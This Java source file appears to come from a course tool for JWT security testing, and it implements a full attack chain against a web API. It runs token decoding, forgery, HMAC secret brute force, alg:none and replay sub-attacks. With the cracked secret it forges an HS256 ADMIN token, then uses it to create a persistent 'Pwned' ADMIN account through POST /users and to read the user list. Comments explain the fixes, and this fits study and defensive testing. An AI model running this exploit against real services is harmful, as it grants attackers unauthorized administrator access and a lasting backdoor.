package rs.raf.bvs.jwttool.attacks;

import org.json.JSONObject;
import rs.raf.bvs.jwttool.http.ApiClient;
import rs.raf.bvs.jwttool.jwt.JwtCodec;
import rs.raf.bvs.jwttool.jwt.JwtParts;

// full-chain demo: we run A1-A5 over the same context and then do priv-esc
// using the secret A3 stored in ctx. If A3 fails to crack the secret,
// the last phase fails - proof that everything rests on the weak HMAC secret
public final class A6_PrivilegeEscalation implements Attack {

    @Override
    public AttackResult run(AttackContext ctx) throws Exception {
        AttackResult r = new AttackResult("Attack 6 - Full Chain (A1->A2->A3->A4->A5 + priv-esc)");

        if (ctx.getToken() == null) {
            r.fail("No token. Log in first (as USER/CREATOR).");
            return r;
        }

        // Phase 1: decode the token, info only
        runSubAttack(r, ctx, new A1_TokenDecoder(),
                "=== Phase 1: A1 - Token Decoder ===");

        // Phase 2: tampering with the old signature
        runSubAttack(r, ctx, new A2_TokenForgery(),
                "=== Phase 2: A2 - Token Forgery (tampering test) ===");

        // Phase 3: brute force the secret from the wordlist, if it works the secret goes into ctx
        // so A5 and the last phase can use it
        runSubAttack(r, ctx, new A3_BruteForceSecret(),
                "=== Phase 3: A3 - Brute Force Secret ===");

        // Phase 4: alg:none bypass (should be rejected)
        runSubAttack(r, ctx, new A4_AlgNoneAttack(),
                "=== Phase 4: A4 - alg:none Bypass ===");

        // Phase 5: expired replay, tokens with no exp never expire
        runSubAttack(r, ctx, new A5_ExpiredReplay(),
                "=== Phase 5: A5 - Expired Replay ===");

        // Phase 6: priv-esc, the core of the attack - we create a rogue ADMIN account
        r.section("=== Phase 6: Privilege Escalation (forge ADMIN + POST /users) ===");

        // without the secret there is no valid signature and no priv-esc
        if (ctx.getSecret() == null || ctx.getSecret().isEmpty()) {
            r.fail("A3 did not crack the secret - without the secret key forging an ADMIN token is impossible.");
            r.setConclusion("The whole attack chain depends on the weak HMAC secret. A strong random >=256-bit secret from env = this final phase does not work.");
            r.setSuccess(false);
            return r;
        }
        String secret = ctx.getSecret();
        r.ok("Using the secret cracked in Phase 3: \"" + secret + "\"");

        // we copy the payload but set role = ADMIN
        JwtParts orig = JwtCodec.split(ctx.getToken());
        JSONObject payload = new JSONObject(orig.payload.toString());
        String oldRole = payload.optString("role", "<none>");
        payload.put("role", "ADMIN");

        // we have the secret, so the signature is valid, the server cannot tell this token from its own
        String headerB64  = JwtCodec.b64UrlEncode(orig.header.toString());
        String payloadB64 = JwtCodec.b64UrlEncode(payload.toString());
        String signature  = JwtCodec.signHS256(headerB64, payloadB64, secret);
        String adminToken = JwtCodec.assemble(headerB64, payloadB64, signature);

        r.info("Role: " + oldRole + " -> ADMIN");
        r.code("Forged ADMIN token", adminToken);

        // the email must be unique, hence the timestamp
        String pwnedEmail = "pwned-" + System.currentTimeMillis() + "@bvs.local";
        JSONObject newUser = new JSONObject()
                .put("name", "Pwned")
                .put("surname", "Admin")
                .put("email", pwnedEmail)
                .put("password", "Pwned123!")
                .put("confirmPassword", "Pwned123!")
                .put("userType", "ADMIN");

        // the key POST: with the forged ADMIN token we create a new ADMIN account
        // if it goes through, we have a persistent backdoor in the database
        ApiClient.HttpResult res = ctx.api().post("/users", newUser.toString(), adminToken);
        r.info("POST /users -> HTTP " + res.status);
        r.code("Response body", res.body);

        if (res.status >= 200 && res.status < 300) {
            r.warn("PRIV ESCALATION SUCCEEDED - created a new ADMIN account (" + pwnedEmail + ") with the forged token.");
            r.warn("This account stays in the database even AFTER any JWT fix - a persistent backdoor.");
            r.setSuccess(true);
        } else if (res.status == 401) {
            r.fail("401 -> signature check rejected the forged token (maybe the secret is not the one from A3?).");
            r.setSuccess(false);
        } else if (res.status == 403) {
            r.ok("403 -> the role guard works in UserResource.");
            r.warn("BUT: the forged token is validly signed. If the role from the token is not re-checked against the DB anywhere, escalation is live.");
        } else {
            r.warn("Unexpected status " + res.status);
        }

        // one more check: does the forged ADMIN token read the user list
        ApiClient.HttpResult listRes = ctx.api().get("/users", adminToken);
        r.info("GET /users -> HTTP " + listRes.status);
        if (listRes.status == 200) {
            r.warn("User list accessible with the forged ADMIN token.");
        }

        r.setConclusion("Full chain: weak secret (Phase 3) + role taken from the token with no DB re-check = persistent ADMIN backdoor. Fix: random >=256-bit secret from env, exp claim, role lookup from the database on every auth check.");
        return r;
    }

    // runs one sub-attack, adds a section title and copies its steps into the main result
    private void runSubAttack(AttackResult r, AttackContext ctx, Attack attack, String label) throws Exception {
        r.section(label);
        AttackResult sub = attack.run(ctx);
        for (int i = 0; i < sub.getSteps().size(); i++) {
            AttackStep step = sub.getSteps().get(i);
            r.getSteps().add(step);
        }
        if (sub.getConclusion() != null) {
            r.info("-> " + sub.getConclusion());
        }
    }
}
